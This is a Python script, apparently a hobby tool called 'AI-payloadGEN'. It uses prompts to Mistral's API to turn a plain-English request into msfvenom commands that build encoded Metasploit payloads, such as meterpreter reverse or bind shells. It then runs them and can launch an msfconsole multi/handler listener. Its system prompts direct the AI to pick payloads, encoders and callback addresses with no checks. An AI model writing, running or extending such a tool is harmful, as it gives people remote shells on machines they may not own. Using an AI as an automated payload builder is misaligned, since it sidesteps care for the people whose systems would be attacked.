import os
import sys
import argparse
import subprocess
from dotenv import load_dotenv
from mistralai.client import Mistral
import shlex
from payloads_encoders_filter_script import filter_payloads
import json
import time

print("loading API key...")
load_dotenv()
api_key = os.getenv("MISTRAL_API_KEY2")
print("successfuly finished loading API key")

if not api_key:
    print("Error: MISTRAL_API_KEY2 not found in your environment variables (.env file).")
    sys.exit(1)

client = Mistral(api_key=api_key)

def call_mistral(system_prompt, user_content):
    """Helper function to send data to Mistral AI."""
    try:
        print("AI proccessing request...")
        response = client.chat.complete(
            model="mistral-large-latest",
            messages=[
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": user_content}
            ],
        )
        print("AI finished proccessing request")
        return response.choices[0].message.content
    
    except Exception as e:
        print(f"Error communicating with Mistral AI: {e}")
        sys.exit(1)


system_prompt = (
    '''
    you are a a key word filter, your input is a client's request for a payload in plain english and your job is to return specific
    details about his request (e.g. type of the os the payload is for, and what kind of result he needs]. Return a list of keywords that can be put
    into a python script that filters payloads that are not relevent for the client's request- if the client requested the payload to be ran on a windows machine then
    add "Windows" to the list so that the filterer could filter any other type of OS except that one. RETURN AND ONLY RETURN ONCE A PYTHON LIST OF KEYWORDS YOU FOUND FOR FOR THE 
    FILTERER- FORMAT: ["Windows", "Meterpreter", "Reverse", ....], NEVER INCLUDE version numbers, build numbers, or any digits in the keywords (e.g. use "windows" not "windows 10" or "win10"),
    since the script is searching at the output of "msfvenom -l payloads" that all of the payloads look like file paths e.g. "windows/meterpreter/bind_hidden_tcp", "linux/x86/meterpreter/bind_tcp_uuid".
    Only use generic terms: OS family, connection type (reverse/bind), payload style (meterpreter/shell/powershell/vnc). No symbols other than letters.
    NO EXPLENATIONS NO ADDINGS NO MARKDOWN CODE FENCES, since you give the result to a specific script, not another AI.
    '''
)

print("\nspecify and clearfy as much as you can about the type of payload you wish.\nthe better you clearfy the better the result.\n(the result pretty much depends on this part)\n")
client_request = input("AI-payloadGEN (PAYLOAD REQUEST)> ")

user_content = client_request

print("sending first API request to AI...")
first_ai_output_keywords = call_mistral(system_prompt, user_content)
first_ai_output_keywords = json.loads(first_ai_output_keywords)
print("getting first AI response...")

print(f"AI response: {first_ai_output_keywords}")

filtered_payloads = filter_payloads(first_ai_output_keywords, "custom-AI-payload-generator/msfvenom_payloads.txt")

print(f"found {len(filtered_payloads)} avaliable payloads that might satisfiy your request")

encoders = "no avaliable encoders at the momment"
try:
    with open("custom-AI-payload-generator/encoders.txt", "r", encoding="utf-8") as f:
        encoders = f.read()
        
except Exception as e:
    print(f"error loading encoders file: {e}")

system_prompt = (
    '''You are a cybersecurity AI payload idea formater. your job is to turn a client's plain English payload idea into a json formated file that can be easily be 
    python automated into real payload creation commands. At the end of the call you will have to return a json file with this exact payload details format: {
  "target_os": "",
  "lhost": "",
  "lport": "",
  "payload_type": "",
  "encoder": "",
  "encoder_iterations": "",
  "output_format": ""
} only pick payload_type from the provided list, only pick encoder from the provided list
at the end of the call- output ONLY valid JSON, no explanation, no markdown code fences. if multiple fields are missing, put ALL questions into ONE single
JSON list, e.g. [\"question 1\", \"question 2\"]. Never output more than one JSON object across multiple lines. Decide payload_type, encoder,
encoder_iterations, output_format, and architecture (x86/x64) yourself, using your best judgment from the provided payload/encoder lists and the
client's request. Never ask the client about these Ã¢â‚¬â€ pick sensible values (e.g. shikata_ga_nai for encoder, 1 for iterations, raw for output_format
if nothing better fits, x64 unless the client's wording implies otherwise). Only ask the client a question when lhost or lport is missing,
since only the client knows those. If asking, return ONLY a JSON list of the missing questions,
 e.g. ["question1", "question2"]. Otherwise return ONLY the final JSON object in the required format.'''
)

user_content = f'''CLIENT request: {client_request}
                   payloads to choose from: {filtered_payloads}
                   avaliable encoders: {encoders}'''

second_ai_output_dict = call_mistral(system_prompt, user_content)
second_ai_output_dict = second_ai_output_dict.strip()
if second_ai_output_dict.startswith("```"):
    second_ai_output_dict = second_ai_output_dict.split("```")[1]
    if second_ai_output_dict.startswith("json"):
        second_ai_output_dict = second_ai_output_dict[4:]
    second_ai_output_dict = second_ai_output_dict.strip()

second_ai_output_dict = json.loads(second_ai_output_dict)

while isinstance(second_ai_output_dict, list):
    question = second_ai_output_dict[0]
    client_answer = input(f"{question} ")

    user_content = f'''CLIENT request: {client_request}
                    your question: {question}
                    client response: {client_answer}
                   payloads to choose from: {filtered_payloads}
                   avaliable encoders: {encoders}'''

    second_ai_output_dict = call_mistral(system_prompt, user_content)
    second_ai_output_dict = json.loads(second_ai_output_dict)

payload_creation_command = f"msfvenom -p {second_ai_output_dict["payload_type"]} LHOST={second_ai_output_dict["lhost"]} LPORT={second_ai_output_dict["lport"]} -f {second_ai_output_dict["output_format"]} -e {second_ai_output_dict["encoder"]} -i {second_ai_output_dict["encoder_iterations"]}"

final_command = shlex.split(payload_creation_command)

payload = subprocess.run(final_command, capture_output=True, text=True, timeout=300)

if payload.returncode != 0:
    print(f"command ran with an error: {payload.stderr}")
    sys.exit(1)
    
else:
    print("Payload generated successfully.")
    start_listener = input("Start a listener now? (y/n): ")
    if start_listener == "y" or start_listener == "":
        print(f"payload: {payload.stdout}")
        set_up_listener_command = f'''msfconsole -x "use exploit/multi/handler; set payload {second_ai_output_dict["payload_type"]}; set LHOST {second_ai_output_dict["lhost"]}; set LPORT {second_ai_output_dict["lport"]}; run;"'''
        listener = subprocess.run(shlex.split(set_up_listener_command))
        print("session ended")         

    else:
        print(f"final payload: {payload.stdout}")